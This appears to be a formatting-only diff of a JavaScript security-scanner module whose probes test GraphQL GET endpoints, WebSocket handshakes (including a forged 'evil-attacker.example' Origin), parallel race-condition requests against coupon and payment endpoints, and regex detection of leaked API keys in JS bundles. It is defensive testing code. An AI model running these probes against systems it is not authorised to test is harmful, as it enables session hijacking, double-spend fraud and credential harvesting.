@@ -738,10 +952,10 @@ export async function graphqlProbe({ baseUrl, paths = null, timeoutMs = DEFAULT_
         evidence: {
           request: `GET ${p}?query={__typename}`,
           responseSnippet: String(getQ.body || '').slice(0, 400),
-          note: 'Queries reachable via GET can be triggered cross-site (CSRF) when auth is cookie-based.'
+          note: 'Queries reachable via GET can be triggered cross-site (CSRF) when auth is cookie-based.',
         },
         confidence: 0.85,
-        source: 'graphql_probe'
+        source: 'graphql_probe',
       });
     }
 
@@ -755,44 +969,73 @@ export async function graphqlProbe({ baseUrl, paths = null, timeoutMs = DEFAULT_
 // unauthenticated access. A finding needs an actual 101 to a forged Origin
 // or with no credentials — never just "a /ws path exists".
 
-const WS_PATHS = ['/ws', '/websocket', '/socket', '/cable', '/realtime', '/ws/chat', '/socket.io/?EIO=4&transport=websocket'];
+const WS_PATHS = [
+  '/ws',
+  '/websocket',
+  '/socket',
+  '/cable',
+  '/realtime',
+  '/ws/chat',
+  '/socket.io/?EIO=4&transport=websocket',
+];
 
 function wsHandshake(targetUrl, { origin = undefined, extraHeaders = {}, timeoutMs = 8000 } = {}) {
   const u = new URL(targetUrl);
   const isTls = u.protocol === 'https:' || u.protocol === 'wss:';
   const port = Number(u.port) || (isTls ? 443 : 80);
   const key = crypto.randomBytes(16).toString('base64');
-  return new Promise((resolve) => {
+  return new Promise(resolve => {
     let done = false;
-    const finish = (r) => { if (!done) { done = true; try { sock.destroy(); } catch {} resolve(r); } };
+    const finish = r => {
+      if (!done) {
+        done = true;
+        try {
+          sock.destroy();
+        } catch {}
+        resolve(r);
+      }
+    };
     let sock;
     const timer = setTimeout(() => finish({ ok: false, error: 'timeout' }), timeoutMs);
-    const lines = () => [
-      `GET ${u.pathname}${u.search} HTTP/1.1`,
-      `Host: ${u.hostname}`,
-      'Upgrade: websocket',
-      'Connection: Upgrade',
-      `Sec-WebSocket-Key: ${key}`,
-      'Sec-WebSocket-Version: 13',
-      ...(origin !== undefined ? [`Origin: ${origin}`] : []),
-      ...Object.entries(extraHeaders).map(([k, v]) => `${k}: ${v}`),
-      '', ''
-    ].join('\r\n');
+    const lines = () =>
+      [
+        `GET ${u.pathname}${u.search} HTTP/1.1`,
+        `Host: ${u.hostname}`,
+        'Upgrade: websocket',
+        'Connection: Upgrade',
+        `Sec-WebSocket-Key: ${key}`,
+        'Sec-WebSocket-Version: 13',
+        ...(origin !== undefined ? [`Origin: ${origin}`] : []),
+        ...Object.entries(extraHeaders).map(([k, v]) => `${k}: ${v}`),
+        '',
+        '',
+      ].join('\r\n');
     let wrote = false;
-    const writeReq = () => { if (!wrote) { wrote = true; sock.write(lines()); } };
+    const writeReq = () => {
+      if (!wrote) {
+        wrote = true;
+        sock.write(lines());
+      }
+    };
     try {
       sock = isTls
         ? tls.connect({ host: u.hostname, port, servername: u.hostname, rejectUnauthorized: false })
         : net.connect({ host: u.hostname, port });
-    } catch (e) { clearTimeout(timer); return finish({ ok: false, error: String(e.message || e) }); }
+    } catch (e) {
+      clearTimeout(timer);
+      return finish({ ok: false, error: String(e.message || e) });
+    }
     sock.on('connect', writeReq);
     sock.on('secureConnect', writeReq);
-    sock.on('error', (e) => { clearTimeout(timer); finish({ ok: false, error: String(e.message || e) }); });
+    sock.on('error', e => {
+      clearTimeout(timer);
+      finish({ ok: false, error: String(e.message || e) });
+    });
     let buf = Buffer.alloc(0);
     let headerDone = false;
     let statusLine = '';
     let postBytes = 0;
-    sock.on('data', (chunk) => {
+    sock.on('data', chunk => {
       buf = Buffer.concat([buf, chunk]);
       if (!headerDone) {
         const idx = buf.indexOf('\r\n\r\n');
@@ -801,10 +1044,16 @@ function wsHandshake(targetUrl, { origin = undefined, extraHeaders = {}, timeout
         statusLine = buf.slice(0, buf.indexOf('\r\n')).toString('latin1');
         const m = /^HTTP\/\d(?:\.\d)?\s+(\d{3})/i.exec(statusLine);
         const status = m ? Number(m[1]) : null;
-        if (status !== 101) { clearTimeout(timer); return finish({ ok: true, status, upgraded: false }); }
+        if (status !== 101) {
+          clearTimeout(timer);
+          return finish({ ok: true, status, upgraded: false });
+        }
         postBytes = buf.length - (idx + 4);
         // Stay open briefly: unsolicited server frames = pre-auth data push.
-        setTimeout(() => { clearTimeout(timer); finish({ ok: true, status: 101, upgraded: true, serverPushedBytes: postBytes }); }, 2500);
+        setTimeout(() => {
+          clearTimeout(timer);
+          finish({ ok: true, status: 101, upgraded: true, serverPushedBytes: postBytes });
+        }, 2500);
       } else {
         postBytes += chunk.length;
       }
@@ -813,8 +1062,12 @@ function wsHandshake(targetUrl, { origin = undefined, extraHeaders = {}, timeout
 }
 
 export async function websocketProbe({
-  baseUrl, paths = null, authToken = null, authHeader = 'authorization',
-  webProbe: recon = null, timeoutMs = DEFAULT_TIMEOUT_MS
+  baseUrl,
+  paths = null,
+  authToken = null,
+  authHeader = 'authorization',
+  webProbe: recon = null,
+  timeoutMs = DEFAULT_TIMEOUT_MS,
 } = {}) {
   const started = Date.now();
   const origin = baseUrl.replace(/\/$/, '');
@@ -837,7 +1090,13 @@ export async function websocketProbe({
 
     // (a) No Origin header at all.
     const noOrigin = await wsHandshake(wsUrl, { timeoutMs: Math.min(timeoutMs, 10000) });
-    checks.push({ path: p, test: 'no-origin', status: noOrigin.status ?? null, upgraded: !!noOrigin.upgraded, error: noOrigin.error || null });
+    checks.push({
+      path: p,
+      test: 'no-origin',
+      status: noOrigin.status ?? null,
+      upgraded: !!noOrigin.upgraded,
+      error: noOrigin.error || null,
+    });
     if (noOrigin.upgraded) {
       findings.push({
         type: 'websocket-no-origin-check',
@@ -847,16 +1106,25 @@ export async function websocketProbe({
         evidence: {
           request: `GET ${p} Upgrade: websocket (no Origin header) → 101 Switching Protocols`,
           serverPushedBytes: noOrigin.serverPushedBytes || 0,
-          note: 'Any website can open this socket from a victim browser (CSWSH) because the server never validates Origin.'
+          note: 'Any website can open this socket from a victim browser (CSWSH) because the server never validates Origin.',
         },
         confidence: 0.9,
-        source: 'websocket_probe'
+        source: 'websocket_probe',
       });
     }
 
     // (b) Forged cross-site Origin.
-    const evil = await wsHandshake(wsUrl, { origin: 'https://evil-attacker.example', timeoutMs: Math.min(timeoutMs, 10000) });
-    checks.push({ path: p, test: 'evil-origin', status: evil.status ?? null, upgraded: !!evil.upgraded, error: evil.error || null });
+    const evil = await wsHandshake(wsUrl, {
+      origin: 'https://evil-attacker.example',
+      timeoutMs: Math.min(timeoutMs, 10000),
+    });
+    checks.push({
+      path: p,
+      test: 'evil-origin',
+      status: evil.status ?? null,
+      upgraded: !!evil.upgraded,
+      error: evil.error || null,
+    });
     if (evil.upgraded) {
       findings.push({
         type: 'websocket-cswsh',
@@ -866,18 +1134,26 @@ export async function websocketProbe({
         evidence: {
           request: `GET ${p} Upgrade: websocket, Origin: https://evil-attacker.example → 101 Switching Protocols`,
           serverPushedBytes: evil.serverPushedBytes || 0,
-          note: 'Cross-Site WebSocket Hijacking: a malicious page can open an authenticated socket as the victim.'
+          note: 'Cross-Site WebSocket Hijacking: a malicious page can open an authenticated socket as the victim.',
         },
         confidence: 0.92,
-        source: 'websocket_probe'
+        source: 'websocket_probe',
       });
     }
 
     // (c) Authentication — only testable when the caller supplies credentials.
     if (authToken) {
-      const authed = await wsHandshake(wsUrl, { extraHeaders: { [authHeader]: `Bearer ${authToken}` }, timeoutMs: Math.min(timeoutMs, 10000) });
+      const authed = await wsHandshake(wsUrl, {
+        extraHeaders: { [authHeader]: `Bearer ${authToken}` },
+        timeoutMs: Math.min(timeoutMs, 10000),
+      });
       const anonHs = await wsHandshake(wsUrl, { origin, timeoutMs: Math.min(timeoutMs, 10000) });
-      checks.push({ path: p, test: 'auth', authedUpgraded: !!authed.upgraded, anonUpgraded: !!anonHs.upgraded });
+      checks.push({
+        path: p,
+        test: 'auth',
+        authedUpgraded: !!authed.upgraded,
+        anonUpgraded: !!anonHs.upgraded,
+      });
       if (!authed.error && authed.upgraded && !anonHs.upgraded) {
         // properly gated — no finding, honest negative recorded
       } else if (anonHs.upgraded) {
@@ -889,21 +1165,32 @@ export async function websocketProbe({
           evidence: {
             request: `GET ${p} Upgrade: websocket (no ${authHeader} header) → 101 Switching Protocols`,
             serverPushedBytes: anonHs.serverPushedBytes || 0,
-            note: 'The socket is reachable with no credentials at all — any client can connect.'
+            note: 'The socket is reachable with no credentials at all — any client can connect.',
           },
           confidence: 0.92,
-          source: 'websocket_probe'
+          source: 'websocket_probe',
         });
       }
     } else {
-      checks.push({ path: p, test: 'auth', skipped: 'no authToken supplied — cannot distinguish public vs broken auth' });
+      checks.push({
+        path: p,
+        test: 'auth',
+        skipped: 'no authToken supplied — cannot distinguish public vs broken auth',
+      });
     }
 
     tested++;
-    if (findings.some((f) => f.url === wsUrl)) break; // one vulnerable endpoint is enough signal
+    if (findings.some(f => f.url === wsUrl)) break; // one vulnerable endpoint is enough signal
   }
 
-  return { tool: 'websocket_probe', baseUrl, endpointsTested: tested, checks, findings, durationMs: Date.now() - started };
+  return {
+    tool: 'websocket_probe',
+    baseUrl,
+    endpointsTested: tested,
+    checks,
+    findings,
+    durationMs: Date.now() - started,
+  };
 }
 
 // ── Tool: race_condition_probe ───────────────────────────────────────────
@@ -913,9 +1200,16 @@ export async function websocketProbe({
 // requests were sent".
 
 export async function raceProbe({
-  baseUrl, endpoint = null, method = 'POST', body = null, headers = {},
-  parallel = 10, expectation = null, stateCheck = null,
-  webProbe: recon = null, timeoutMs = DEFAULT_TIMEOUT_MS
+  baseUrl,
+  endpoint = null,
+  method = 'POST',
+  body = null,
+  headers = {},
+  parallel = 10,
+  expectation = null,
+  stateCheck = null,
+  webProbe: recon = null,
+  timeoutMs = DEFAULT_TIMEOUT_MS,
 } = {}) {
   const started = Date.now();
   const origin = baseUrl.replace(/\/$/, '');
@@ -926,7 +1220,12 @@ export async function raceProbe({
   if (endpoint) candidates.push(endpoint);
   if (recon) {
     for (const ep of recon.endpoints || []) {
-      if (/coupon|discount|voucher|promo|transfer|redeem|apply|purchase|order|payment|withdraw/i.test(ep)) candidates.push(ep);
+      if (
+        /coupon|discount|voucher|promo|transfer|redeem|apply|purchase|order|payment|withdraw/i.test(
+          ep
+        )
+      )
+        candidates.push(ep);
     }
   }
   candidates.push('/api/coupon/apply', '/api/coupons/apply', '/coupon/apply');
@@ -934,7 +1233,7 @@ export async function raceProbe({
   const readState = async () => {
     if (!stateCheck?.path) return null;
     const url = `${origin}${stateCheck.path}`;
-    const r = await fetchTimed(url, {}, timeoutMs).catch((e) => ({ error: e.message }));
+    const r = await fetchTimed(url, {}, timeoutMs).catch(e => ({ error: e.message }));
     if (r.error) return { error: r.error };
     const j = tryJson(r.body);
     const val = j && stateCheck.field ? j[stateCheck.field] : null;
@@ -947,11 +1246,11 @@ export async function raceProbe({
     const opts = {
       method: method.toUpperCase(),
       headers: { 'content-type': 'application/json', ...headers },
-      ...(method.toUpperCase() === 'GET' ? {} : { body: JSON.stringify(reqBody) })
+      ...(method.toUpperCase() === 'GET' ? {} : { body: JSON.stringify(reqBody) }),
     };
 
     const stateBefore = await readState();
-    const base = await fetchTimed(url, opts, timeoutMs).catch((e) => ({ error: e.message }));
+    const base = await fetchTimed(url, opts, timeoutMs).catch(e => ({ error: e.message }));
     if (base.error || [404, 405, 501].includes(base.status) || base.status >= 500) {
       checks.push({ endpoint: ep, skipped: `baseline ${base.status ?? base.error}` });
       continue;
@@ -962,14 +1261,21 @@ export async function raceProbe({
       Array.from({ length: parallel }, () => fetchTimed(url, opts, timeoutMs))
     );
     const windowMs = Date.now() - t0;
-    const results = settled.map((r) => r.status === 'fulfilled'
-      ? { status: r.value.status, ms: r.value.durationMs }
-      : { error: String(r.reason?.message || r.reason) });
-    const okCount = results.filter((r) => r.status >= 200 && r.status < 300).length;
+    const results = settled.map(r =>
+      r.status === 'fulfilled'
+        ? { status: r.value.status, ms: r.value.durationMs }
+        : { error: String(r.reason?.message || r.reason) }
+    );
+    const okCount = results.filter(r => r.status >= 200 && r.status < 300).length;
     const stateAfter = await readState();
 
     const check = { endpoint: ep, parallel, windowMs, okCount, baselineStatus: base.status };
-    if (stateBefore && stateAfter && typeof stateBefore.value === 'number' && typeof stateAfter.value === 'number') {
+    if (
+      stateBefore &&
+      stateAfter &&
+      typeof stateBefore.value === 'number' &&
+      typeof stateAfter.value === 'number'
+    ) {
       check.stateBefore = stateBefore.value;
       check.stateAfter = stateAfter.value;
       check.stateDelta = stateAfter.value - stateBefore.value;
@@ -979,11 +1285,17 @@ export async function raceProbe({
     const maxSuccess = expectation?.maxSuccess;
     const maxTotalDelta = expectation?.maxTotalDelta;
     const violatedSuccess = maxSuccess != null && okCount > maxSuccess;
-    const violatedDelta = maxTotalDelta != null && check.stateDelta != null && Math.abs(check.stateDelta) > Math.abs(maxTotalDelta);
+    const violatedDelta =
+      maxTotalDelta != null &&
+      check.stateDelta != null &&
+      Math.abs(check.stateDelta) > Math.abs(maxTotalDelta);
 
     if (violatedSuccess || violatedDelta) {
       const statusHist = {};
-      for (const r of results) { const k = r.status ?? `err:${r.error}`; statusHist[k] = (statusHist[k] || 0) + 1; }
+      for (const r of results) {
+        const k = r.status ?? `err:${r.error}`;
+        statusHist[k] = (statusHist[k] || 0) + 1;
+      }
       findings.push({
         type: 'race-condition',
         title: `Race condition at ${method.toUpperCase()} ${ep}: ${okCount}/${parallel} parallel requests succeeded (limit: ${maxSuccess ?? 'n/a'})`,
@@ -998,10 +1310,10 @@ export async function raceProbe({
           stateAfter: check.stateAfter ?? null,
           stateDelta: check.stateDelta ?? null,
           expectedMaxDelta: maxTotalDelta ?? null,
-          note: 'Parallel execution exceeded the stated single-flight limit — missing lock/serialization on a state-changing action (double-spend, coupon reuse, overdraft).'
+          note: 'Parallel execution exceeded the stated single-flight limit — missing lock/serialization on a state-changing action (double-spend, coupon reuse, overdraft).',
         },
         confidence: 0.88,
-        source: 'race_condition_probe'
+        source: 'race_condition_probe',
       });
       break;
     }
@@ -1009,7 +1321,13 @@ export async function raceProbe({
     check.verdict = `no race: ${okCount}/${parallel} succeeded within limit ${maxSuccess ?? '(no limit given)'}`;
   }
 
-  return { tool: 'race_condition_probe', baseUrl, checks, findings, durationMs: Date.now() - started };
+  return {
+    tool: 'race_condition_probe',
+    baseUrl,
+    checks,
+    findings,
+    durationMs: Date.now() - started,
+  };
 }
 
 // ── Tool: secrets_in_js_probe ────────────────────────────────────────────
@@ -1020,17 +1338,36 @@ export async function raceProbe({
 
 const SECRET_PATTERNS = [
   { name: 'aws-access-key', regex: /\bAKIA[0-9A-Z]{16}\b/, confidence: 0.97 },
-  { name: 'aws-secret-key', regex: /aws[_-]?secret[_-]?access[_-]?key["']?\s*[:=]\s*["']([A-Za-z0-9/+=]{40})["']/i, confidence: 0.95 },
+  {
+    name: 'aws-secret-key',
+    regex: /aws[_-]?secret[_-]?access[_-]?key["']?\s*[:=]\s*["']([A-Za-z0-9/+=]{40})["']/i,
+    confidence: 0.95,
+  },
   { name: 'stripe-live-key', regex: /\bsk_live_[A-Za-z0-9]{16,}\b/, confidence: 0.97 },
   { name: 'stripe-test-key', regex: /\bsk_test_[A-Za-z0-9]{16,}\b/, confidence: 0.9 },
-  { name: 'github-token', regex: /\b(ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{22,})\b/, confidence: 0.97 },
+  {
+    name: 'github-token',
+    regex: /\b(ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{22,})\b/,
+    confidence: 0.97,
+  },
   { name: 'slack-token', regex: /\bxox[baprs]-[A-Za-z0-9-]{10,}\b/, confidence: 0.95 },
   { name: 'google-api-key', regex: /\bAIza[0-9A-Za-z\-_]{35}\b/, confidence: 0.95 },
-  { name: 'private-key-block', regex: /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/, confidence: 0.97 },
-  { name: 'generic-secret', regex: /(?:api[_-]?key|apikey|secret|token|password|passwd|private[_-]?key|client[_-]?secret)\s*[:=]\s*["']([^"'`\s]{12,128})["']/i, confidence: 0.8, generic: true }
+  {
+    name: 'private-key-block',
+    regex: /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/,
+    confidence: 0.97,
+  },
+  {
+    name: 'generic-secret',
+    regex:
+      /(?:api[_-]?key|apikey|secret|token|password|passwd|private[_-]?key|client[_-]?secret)\s*[:=]\s*["']([^"'`\s]{12,128})["']/i,
+    confidence: 0.8,
+    generic: true,
+  },
 ];
 
-const PLACEHOLDER_RE = /test|example|dummy|changeme|xxxx|12345|placeholder|your[_-]?key|insert|sample|fake/i;
+const PLACEHOLDER_RE =
+  /test|example|dummy|changeme|xxxx|12345|placeholder|your[_-]?key|insert|sample|fake/i;
 
 function shannonEntropy(s) {
   const freq = {};
@@ -1049,37 +1386,63 @@ function redactSecret(v) {
   return s.slice(0, 6) + '…' + s.slice(-4) + ' [REDACTED]';
 }
 
-export async function secretsProbe({ baseUrl, maxFiles = 10, maxBytes = 2_000_000, timeoutMs = DEFAULT_TIMEOUT_MS } = {}) {
+export async function secretsProbe({
+  baseUrl,
+  maxFiles = 10,
+  maxBytes = 2_000_000,
+  timeoutMs = DEFAULT_TIMEOUT_MS,
+} = {}) {
   const started = Date.now();
   const origin = baseUrl.replace(/\/$/, '');
   const checks = [];
   const findings = [];
   const seenSecret = new Set();
 
-  const home = await fetchTimed(baseUrl, {}, timeoutMs).catch((e) => ({ error: e.message }));
+  const home = await fetchTimed(baseUrl, {}, timeoutMs).catch(e => ({ error: e.message }));
   if (home.error || typeof home.body !== 'string') {
-    return { tool: 'secrets_in_js_probe', baseUrl, checks, findings, error: home.error || 'no body', durationMs: Date.now() - started };
+    return {
+      tool: 'secrets_in_js_probe',
+      baseUrl,
+      checks,
+      findings,
+      error: home.error || 'no body',
+      durationMs: Date.now() - started,
+    };
   }
 
   // Same-origin <script src> URLs.
   const jsUrls = [];
-  const baseHost = (() => { try { return new URL(baseUrl).origin; } catch { return null; } })();
+  const baseHost = (() => {
+    try {
+      return new URL(baseUrl).origin;
+    } catch {
+      return null;
+    }
+  })();
   for (const m of home.body.matchAll(/<script\b[^>]*\bsrc\s*=\s*["']([^"'#]+)["']/gi)) {
     try {
       const u = new URL(m[1], baseUrl);
       if (u.origin === baseHost) jsUrls.push(u.toString());
-    } catch { /* skip */ }
+    } catch {
+      /* skip */
+    }
   }
   // Inline scripts are scanned too.
-  const inlineScripts = [...home.body.matchAll(/<script\b(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script\s*>/gi)]
-    .map((m) => m[1]).filter((s) => s && s.trim());
+  const inlineScripts = [
+    ...home.body.matchAll(/<script\b(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script\s*>/gi),
+  ]
+    .map(m => m[1])
+    .filter(s => s && s.trim());
 
   const scanSource = (source, fileUrl) => {
     const lines = source.split('\n');
     for (const pat of SECRET_PATTERNS) {
-      const re = new RegExp(pat.regex.source, pat.regex.flags.includes('g') ? pat.regex.flags : pat.regex.flags + 'g');
+      const re = new RegExp(
+        pat.regex.source,
+        pat.regex.flags.includes('g') ? pat.regex.flags : pat.regex.flags + 'g'
+      );
       for (const m of source.matchAll(re)) {
-        const raw = pat.generic ? (m[1] || m[0]) : m[0];
+        const raw = pat.generic ? m[1] || m[0] : m[0];
         if (!raw || PLACEHOLDER_RE.test(raw)) continue;
         if (pat.generic && (shannonEntropy(raw) < 3.4 || raw.length < 16)) continue;
         const key = `${pat.name}:${raw.slice(0, 12)}`;
@@ -1099,21 +1462,22 @@ export async function secretsProbe({ baseUrl, maxFiles = 10, maxBytes = 2_000_00
             line: lineNo,
             redactedValue: redactSecret(raw),
             context: lineText.replace(raw, '[REDACTED]'),
-            note: 'A high-confidence secret is shipped to every visitor inside the JS bundle — rotate it and move it server-side.'
+            note: 'A high-confidence secret is shipped to every visitor inside the JS bundle — rotate it and move it server-side.',
           },
           confidence: pat.confidence,
-          source: 'secrets_in_js_probe'
+          source: 'secrets_in_js_probe',
         });
       }
     }
   };
 
-  for (const [i, src] of inlineScripts.entries()) scanSource(src, `${origin}/#inline-script-${i + 1}`);
+  for (const [i, src] of inlineScripts.entries())
+    scanSource(src, `${origin}/#inline-script-${i + 1}`);
   checks.push({ test: 'inline-scripts', scanned: inlineScripts.length });
 
   let fetched = 0;
   for (const jsUrl of [...new Set(jsUrls)].slice(0, maxFiles)) {
-    const res = await fetchTimed(jsUrl, {}, timeoutMs).catch((e) => ({ error: e.message }));
+    const res = await fetchTimed(jsUrl, {}, timeoutMs).catch(e => ({ error: e.message }));
     if (res.error || typeof res.body !== 'string' || !res.body.length) {
       checks.push({ file: safePath(jsUrl), error: res.error || 'empty' });
       continue;
@@ -1122,11 +1486,21 @@ export async function secretsProbe({ baseUrl, maxFiles = 10, maxBytes = 2_000_00
     const before = findings.length;
     scanSource(source, jsUrl);
     fetched++;
-    checks.push({ file: safePath(jsUrl), bytes: source.length, secretsFound: findings.length - before });
+    checks.push({
+      file: safePath(jsUrl),
+      bytes: source.length,
+      secretsFound: findings.length - before,
+    });
   }
   checks.push({ test: 'js-files', fetched });
 
-  return { tool: 'secrets_in_js_probe', baseUrl, checks, findings, durationMs: Date.now() - started };
+  return {
+    tool: 'secrets_in_js_probe',
+    baseUrl,
+    checks,
+    findings,
+    durationMs: Date.now() - started,
+  };
 }
 
 /** Dispatch table used by ToolExecutor.executeBuiltIn (merged with HTTP_PROBES). */
@@ -1137,5 +1511,5 @@ export const ADV_PROBES = Object.freeze({
   graphql_probe: graphqlProbe,
   websocket_probe: websocketProbe,
   race_condition_probe: raceProbe,
-  secrets_in_js_probe: secretsProbe
+  secrets_in_js_probe: secretsProbe,
 });
